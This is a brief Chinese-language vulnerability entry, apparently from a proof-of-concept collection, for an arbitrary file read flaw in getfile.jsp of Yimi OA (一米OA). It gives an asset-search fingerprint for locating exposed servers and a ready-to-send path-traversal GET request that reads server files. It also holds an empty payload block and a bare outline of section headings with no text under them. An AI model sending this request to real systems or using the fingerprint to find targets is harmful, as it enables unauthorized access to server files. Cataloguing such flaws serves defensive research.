# 一米OAgetfile.jsp任意文件读取漏洞

- **系统**：一米OAgetfile.jsp　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`app.name="一米 OA"`
- **请求**：`GET /public/getfile.jsp?user=1&prop=activex&filename=../public/getfile&extname=jsp HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Cookie: JSESSIONID=6D52D786191AC0528ECD915A12964B1D`

**请求体 / payload**
```

```

**其他**
- 一米OA getfile.jsp 任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 一米OA